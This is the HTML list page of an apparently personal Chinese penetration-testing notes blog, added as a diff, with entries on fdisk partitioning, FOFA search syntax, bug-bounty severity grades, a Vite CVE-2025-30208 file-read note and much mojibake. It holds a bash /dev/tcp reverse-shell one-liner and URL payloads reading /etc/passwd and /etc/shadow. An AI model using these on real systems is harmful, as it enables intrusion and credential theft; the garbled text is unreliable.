@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head>
+	<meta name="generator" content="Hugo 0.148.1"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>My New Hugo Site</title>
+
+<meta name="description" content="">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/index.xml">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="My New Hugo Site (Alt + H)">My New Hugo Site</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>本体安装 流程参考：http://blog.ccyg.studio/article/4f6cfa0a-ad98-4adb-af08-79a8a5b1d674/
+分区、格式化、挂�? lsbsk #查看磁盘信息fdisk /dev/sda #创建sda分区mkfs.ext4 /dev/sda1 #将sda1格式�? fdisk -l：显示设备的分区表信息�?
+-n：创建一个新的分区�?
+-d：删除一个分区�?
+-p：打印分区表的内容�?
+-t：更改分区的类型�?
+-u：以扇区单位显示分区信息�?
+-w：将分区表写入磁盘�?
+实例2：创建一个新的分�?
+要创建一个新的分区，可以使用以下命令�?
+[linux@bashcommandnotfound.cn ~]# fdisk /dev/sdb # 进入fdisk交互界面后，依次输入以下命令�? n # 创建新分区，可以默认直接回车 p # 创建主分区，可以默认直接回车 1 # 输入分区号，这里设置�?，可以默认直接回�? [起始扇区] # 设置起始扇区，可以默认直接回�? [结束扇区] # 设置结束扇区，可以默认直接回�? w # 将分区表写入磁盘并退�? 请将[起始扇区]和[结束扇区]替换为实际的数值�?
+实例3：删除一个分�?
+要删除一个分区，可以使用以下命令�?
+[linux@bashcommandnotfound.cn ~]# fdisk /dev/sdb # 进入fdisk交互界面后，依次输入以下命令�? d # 删除分区 [分区号] # 要删除的分区�? w # 将分区表写入磁盘并退�? AI写代码bash123456 请将[分区号]替换为要删除的分区号�?
+实例4：创建分区、格式化系统、挂载分�?
+# 创建分区 [linux@bashcommandnotfound.cn ~]# fdisk /dev/sdb #执行后按n，然后一直回车到没有选项，最后按w 欢迎使用 fdisk (util-linux 2.23.2)�? 更改将停留在内存中，直到您决定将更改写入磁盘�? 使用写入命令前请三思�? Device does not contain a recognized partition table 使用磁盘标识�?0x917df835 创建新的 DOS 磁盘标签�? 命令(输入 m 获取帮助)：n Partition type: p primary (0 primary, 0 extended, 4 free) e extended Select (default p): Using default response p 分区�?(1-4，默�?1)�? 起始 扇区 (2048-1048575999，默认为 2048)�? 将使用默认�?2048 Last 扇区, &#43;扇区 or &#43;size{K,M,G} (2048-1048575999，默认为 1048575999)�? 将使用默认�?1048575999 分区 1 已设置为 Linux 类型，大小设�?500 GiB 命令(输入 m 获取帮助)�? 命令(输入 m 获取帮助)�? 命令(输入 m 获取帮助)�? 命令(输入 m 获取帮助)：w The partition table has been altered! Calling ioctl() to re-read partition table. 正在同步磁盘�? # 格式化系�? [linux@bashcommandnotfound.cn ~]# mkfs.xfs /dev/sdb1 #设置文件系统在这里设置xfs，也可以设置ext4 # 创建挂载目录 [linux@bashcommandnotfound.cn ~]# mkdir /ssd #手动临时挂载 [linux@bashcommandnotfound.cn ~]# mount /dev/sdb1 /ssd # 或永久挂�? # 设置分区�? [linux@bashcommandnotfound.cn ~]# echo &#34;/dev/sdb1 /ssd xfs defaults 0 0&#34; &gt;&gt;/etc/fstab # 使分区表生效 [linux@bashcommandnotfound.cn ~]# mount -a # 查看块设备以及挂载点信息 [linux@bashcommandnotfound.cn ~]# lsblk AI写代码bash mkfs 磁盘分区完毕后自然就是要进行文件系统的格式化 **格式�?*其实就是创建文件系统。命令就�?==&gt;mkfs（make fileststem），这个命令只是个综合命令。它会调用正确的文件系统格式化工�? **功能�?*mkfs是个综合命令 使用 mkfs [tab] [tab]：按下两下tab键查看系统支持哪些文件系统的格式化功�? mkfs -t [文件系统格式名]===&gt;等同于mkfs.文件系统格式�? mkfs -t xfs �?mkfs.xfs相同 mount 语法
+...</p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/auran_lu/arch%E6%90%AD%E5%BB%BA%E6%89%8B%E5%86%8C/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>影响版本 6.2.0 ��?6.2.2
+6.1.0 ��?6.1.1
+6.0.0 ��?6.0.11
+5.0.0 ��?5.4.14
+4.5.9 及更早版��?
+原理 CVE-2025-30208是Vite开发服务器中的一个访问控制绕过漏洞��?
+此漏洞的存在是由于在处理URL请求时，Vite开发服务器未严格验证路径，导致未经身份验证的攻击者可以构造特殊的URL来获取项目根目录之外的敏感文件。在受影响的Vite版本中，攻击者可以通过在URL中添加特定的查询参数（如?raw??��?import&amp;raw??）绕过@fs路径访问限制，从而访问服务器上任意文件的内容��?
+环境搭建 https://github.com/vulhub/vulhub/blob/master/vite/CVE-2025-30208/README.zh-cn.md Hunter测绘示例��? web.body=&#34;/@vite/client&#34; 复现 url拼接/@fs/etc/passwd?raw??/@fs/etc/shadow?raw??/etc/shadow?import&amp;raw?? </p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/auran_lu/cve/cve-2025-30208/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p></p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/auran_lu/hackthebox/untitled/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p></p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/auran_lu/hexohugo&#43;github%E6%9E%B6%E6%9E%84blog%E9%83%A8%E7%BD%B2%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/hugo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p></p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/auran_lu/python/python%E5%85%A5%E9%97%A8/untitled/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>hack the box
+try hack me
+</p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/auran_lu/temp/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索；
+如果查询表达式有多个与或关系，尽量在外面用（）包含起来；
+高级搜索
+逻辑连接��?
+具体含义
+=
+匹配��?““时，可查询不存在字段或者值为空的情况��?
+==
+完全匹配��?=““时，可查询存在且值为空的情况��?
+&amp;&amp;
+��?
+||
+��?
+!=
+不匹配，!=““时，可查询值不为空的情况��?
+*=
+模糊匹配，使��?或��?进行搜索��?
+()
+确认查询优先级，括号内容优先级最高��?
+关于建站软件的搜索语法请参考：组件列表
+基础类（General��? 语法 例句 用途说��? = != *= ip ip=“1.1.1.1” 通过单一IPv4地址进行查询 ��? ��? - ip=“220.181.111.1/24” 通过IPv4 C段进行查��? ��? ��? - ip=“2600:9000:202a:2600:18:4ab7:f600:93a1” 通过单一Ipv6地址进行查询 ��? ��? - port port=“6379” 通过端口号进行查��? ��? ��? ��? domain domain=“qq.com” 通过根域名进行查��? ��? ��? ��? host host=&#34;.fofa.info” 通过主机名进行查��? ��? ��? ��? os os=“centos” 通过操作系统进行查询 ��? ��? ��? server server=“Microsoft-IIS/10” 通过服务器进行查��? ��? ��? ��? asn asn=“19551” 通过自治系统号进行搜��? ��? ��? ��? org org=“LLC Baxet” 通过所属组织进行查��? ��? ��? ��? is_domain is_domain=true 筛选拥有域名的资产 ��? - - is_domain=false 筛选没有域名的资产 ��? - - is_ipv6 is_ipv6=true 筛选是ipv6的资��? ��? - - is_ipv6=false 筛选是ipv4的资��? ��? - - 标记类（Special Label��? 语法 例句 用途说��? = != *= app app=“Microsoft-Exchange” 通过FOFA整理的规则进行查��? ��? - - fid fid=“sSXXGNUO2FefBTcCLIT/2Q==” 通过FOFA聚合的站点指纹进行查��? ��? ��? - product product=“NGINX” 通过FOFA标记的产品名进行查询 ��? ��? - product.version product=“Roundcube-Webmail” &amp;&amp; product.version=“1.6.10” 通过FOFA标记的产品版本号进行查询 ��? ��? - category category=“服务” 通过FOFA标记的分类进行查��? ��? ��? - type type=“service” 筛选协议资��? ��? - - type=“subdomain” 筛选服务（网站类）资产 ��? - - cloud_name cloud_name=“Aliyundun” 通过云服务商进行查询 ��? ��? ��? is_cloud is_cloud=true 筛选是云服务的资产 ��? - - is_cloud=false 筛选不是云服务的资��? ��? - - is_fraud is_fraud=true 筛选是仿冒垃圾站群的资��?（专业版及以上） ��? - - is_fraud=false 筛选不是仿冒垃圾站群的资产（已默认筛选） ��? - - is_honeypot is_honeypot=true 筛选是蜜罐的资��?（专业版及以上） ��? - - is_honeypot=false 筛选不是蜜罐的资产（已默认筛选） ��? - - 协议��?（type=service) 语法 例句 用途说��? = != *= protocol protocol=“quic” 通过协议名称进行查询 ��? ��? ��? banner banner=“users” 通过协议返回信息进行查询 ��? ��? - banner_hash banner_hash=“7330105010150477363” 通过协议响应体计算的hash值进行查��?（个人版及以上） ��? ��? - banner_fid banner_fid=“zRpqmn0FXQRjZpH8MjMX55zpMy9SgsW8” 通过协议返回信息结构计算的指纹值进行查询��?（个人版及以上） ��? ��? - base_protocol base_protocol=“udp” 查询传输层为udp协议的资��? ��? ��? - base_protocol=“tcp” 查询传输层为tcp协议的资��? ��? ��? - 网站类（type=subdomain��? 语法 例句 用途说��? = != *= title title=“beijing” 通过网站标题进行查询 ��? ��? ��? header header=“elastic” 通过响应标头进行查询 ��? ��? - header_hash header_hash=“1258854265” 通过http/https响应头计算的hash值进行查��?（个人版及以上） ��? ��? ��? body body=“网络空间测绘” 通过HTML正文进行查询 ��? ��? - body_hash body_hash=&#34;-2090962452” 通过HTML正文计算的hash值进行查��? ��? ��? - js_name js_name=“js/jquery.js” 通过HTML正文包含的JS进行查询 ��? ��? ��? js_md5 js_md5=“82ac3f14327a8b7ba49baa208d4eaa15” 通过JS源码进行查询 ��? ��? ��? cname cname=“customers.spektrix.com” 通过别名记录进行查询 ��? ��? ��? cname_domain cname_domain=“siteforce.com” 通过别名记录解析的主域名进行查询 ��? ��? ��? icon_hash icon_hash=&#34;-247388890” 通过网站图标的hash值进行查��? ��? ��? - status_code status_code=“402” 筛选服务状态为402的服务（网站）资��? ��? ��? - icp icp=“京ICP��?30173��? 通过HTML正文包含的ICP备案号进行查��? ��? ��? ��? sdk_hash sdk_hash=“Are3qNnP2Eqn7q5kAoUO3l&#43;w3mgVIytO” 通过网站嵌入的第三方代码计算的hash值进行查��?（商业版及以上） ��? ��? - 地理位置（Location��? 语法 例句 用途说��? = != *= country country=“CN” 通过国家的简称代码进行查��? ��? ��? - country=“中国” 通过国家中文名称进行查询 ��? ��? - region region=“Zhejiang” 通过省份/地区英文名称进行查询 ��? ��? - region=“浙江” 通过省份/地区中文名称进行查询（仅支持中国地区��? ��? ��? - city city=“Hangzhou” 通过城市英文名称进行查询 ��? ��? - 证书类（Certificate��? 语法 例句 用途说��? = != *= cert cert=“baidu” 通过证书进行查询 ��? ��? - cert.subject cert.subject=“Oracle Corporation” 通过证书的持有者进行查��? ��? ��? ��? cert.issuer cert.issuer=“DigiCert” 通过证书的颁发者进行查��? ��? ��? ��? cert.subject.org cert.subject.org=“Oracle Corporation” 通过证书持有者的组织进行查询 ��? ��? ��? cert.subject.cn cert.subject.cn=“baidu.com” 通过证书持有者的通用名称进行查询 ��? ��? ��? cert.issuer.org cert.issuer.org=“cPanel, Inc.” 通过证书颁发者的组织进行查询 ��? ��? ��? cert.issuer.cn cert.issuer.cn=“Synology Inc. CA” 通过证书颁发者的通用名称进行查询 ��? ��? ��? cert.domain cert.domain=“huawei.com” 通过证书持有者的根域名进行查��? ��? ��? ��? cert.is_equal cert.is_equal=true 筛选证书颁发者和持有者匹配的资产 （个人版及以上） ��? - - cert.is_equal=false 筛选证书颁发者和持有者不匹配的资��?（个人版及以上） ��? - - cert.is_valid cert.is_valid=true 筛选证书是有效证书的资��?（个人版及以上） ��? - - cert.is_valid=false 筛选证书是无效证书的资��?（个人版及以上） ��? - - cert.is_match cert.is_match=true 筛选证书和域名匹配的资��?（个人版及以上） ��? - - cert.is_match=false 筛选证书和域名不匹配的资产 （个人版及以上） ��? - - cert.is_expired cert.is_expired=true 筛选证书已过期的资��?（个人版及以上） ��? - - cert.is_expired=false 筛选证书未过期的资��?（个人版及以上） ��? - - jarm jarm=“2ad2ad0002ad2ad22c2ad2ad2ad2ad2eac92ec34bcc0cf7520e97547f83e81” 通过JARM指纹进行查询 ��? ��? ��? tls.version tls.version=“TLS 1.3” 通过tls的协议版本进行查��? ��? ��? - tls.ja3s tls.ja3s=“15af977ce25de452b96affa2addb1036” 通过tls的ja3s指纹进行查询 ��? ��? ��? cert.sn cert.sn=“356078156165546797850343536942784588840297” 通过证书序列号进行查��? ��? ��? - cert.not_after.after cert.not_after.after=“2025-03-01” 筛选某证书到期日期后的证书 ��? - - cert.not_after.before cert.not_after.before=“2025-03-01” 筛选某证书到期日期前的证书 ��? - - cert.not_before.after cert.not_before.after=“2025-03-01” 筛选某证书生效日期后的证书 ��? - - cert.not_before.before cert.not_before.before=“2025-03-01” 筛选某证书生效日期前的证书 ��? - - 时间类（Last update time��? 语法 例句 用途说��? = != *= after after=“2023-01-01” 筛选某一时间之后有更新的资产 ��? - - before before=“2023-12-01” 筛选某一时间之前有更新的资产 ��? - - after&amp;before after=“2023-01-01” &amp;&amp; before=“2023-12-01” 筛选某一时间区间有更新的资产 ��? - - 独立IP语法（独立IP系列语法，不可和上面其他语法共用��? 语法 例句 用途说��? = != *= port_size port_size=“6” 筛选开放端口数量等��?个的独立IP （个人版及以上） ��? ��? - port_size_gt port_size_gt=“6” 筛选开放端口数量大��?个的独立IP （个人版及以上） ��? - - port_size_lt port_size_lt=“12” 筛选开放端口数量小��?2个的独立IP （个人版及以上） ��? - - ip_ports ip_ports=“80,161” 筛选同时开放不同端口的独立IP ��? - - ip_country ip_country=“CN” 通过国家的简称代码进行查询独立IP ��? - - ip_region ip_region=“Zhejiang” 通过省份/地区英文名称进行查询独立IP ��? - - ip_city ip_city=“Hangzhou” 通过城市英文名称进行查询独立IP ��? - - ip_after ip_after=“2021-03-18” 筛选某一时间之后有更新的独立IP ��? - - ip_before ip_before=“2019-09-09” 筛选某一时间之前有更新的独立IP ��? - - </p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/fofa%E8%AF%AD%E6%B3%95/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>vim /etc/apt/source.list deb http://mirrors.aliyun.com/kali kali-rolling main non-free non-free-firmware contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free non-free-firmware contrib </p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/kali%E6%BA%90/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>⚠️ *一、高危漏��? 定义：可直接导致系统权限被获取、核心数据泄露或业务遭受严重破坏的漏洞��? 典型漏洞类型��?
+**权限控制��?*：直接获取服务器或客户端权限（如远程命令执行、任意文件上传获取Webshell、SQL注入获取系统权限��?4��? 敏感信息泄露：核心数据库SQL注入、硬编码密钥导致大规模用户数据泄��?4��? 严重逻辑缺陷：绕过认证直接访问后台、任意账号密码重置、短信验证码绕过210��? 高危越权操作：未授权修改订单、支付信息或用户敏感数据4��? 奖励范围��?00��?000元（例如12306对高危漏洞的悬赏��?6��? ⚠️ *二、中危漏��? 定义：需交互或特定条件才能利用，危害程度低于高危漏洞，但仍可导致敏感信息泄露或越权操作��? 典型漏洞类型��?
+**交互型漏��?*：存储型XSS（需用户触发）、CSRF涉及敏感操作（如修改资料��?4��? 文件操作漏洞：任意文件读��?下载（如配置文件泄露数据库密码）29��? **普通越权访��?*：绕过限制查看非敏感用户信息或执行低风险操作410��? 信息泄露：源码压缩包泄漏、内网敏感信息泄露（通过SSRF��?��? 奖励范围��?00��?00元（例如12306对中危漏洞的悬赏��?6��? ⚠️ *三、低危漏��? 定义：危害较小，通常难以直接利用或仅影响非核心功能��? 典型漏洞类型��?
+轻微信息泄露：路径泄露、SVN信息泄漏、PHP报错信息暴露28��? 低风险逻辑漏洞：提交频率限制缺失（但无法直接利用）2��? 反射型XSS：需用户点击特定链接且无持久危害28��? 注意：公益SRC通常不收反射型XSS，专属SRC可能根据厂商要求收录82��? 奖励范围��?0��?00元（例如12306对低危漏洞的悬赏��?6��? 📊 *漏洞等级对比与典型示��? 等级 定义描述 典型漏洞示例 *奖励范围（参��?2306��? 高危 直接威胁系统核心安全，可致权限失控或严重数据泄露 远程命令执行、任意文件上传、核心数据库SQL注入 500��?000��? 中危 需交互或条件利用，可致敏感信息泄露或越权操��? 存储型XSS、任意文件读取、普通越权访��? 100��?00��? 低危 危害小，仅泄露非敏感信息或影响有限功��? 路径泄露、反射型XSS、配置信息暴��? 50��?00��? 🔍 *四、关键补充原��? **漏洞有效性判��?*��? 仅收**可验证危��?*的漏洞，拒绝扫描器无实际利用证明的结��?8��? 同一漏洞源（如同一框架导致的多个页面漏洞）仅计一次奖��?��? **排除的漏洞类��?*��? 公益SRC通常不收反射型XSS、CSRF、目录遍历；专属SRC依厂商定制范��?8��? HTTP.sys远程执行、慢速攻击（Slowloris）等拒绝服务（DoS）类漏洞不予收录210��? **奖励与修复关��?*��? 漏洞修复前被公开则不计奖励，首位报告者优先获��?8�� </p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E5%88%86%E7%BA%A7/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>bash -i &gt;&amp; /dev/tcp/192.168.23.134/283 0&gt;&amp;1
+</p>
+  </div>
+  <footer class="entry-footer"></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E5%8F%8D%E5%BC%B9shell/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="prev" href="http://localhost:1313/page/10/">
+      «&nbsp;Prev&nbsp;
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">My New Hugo Site</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
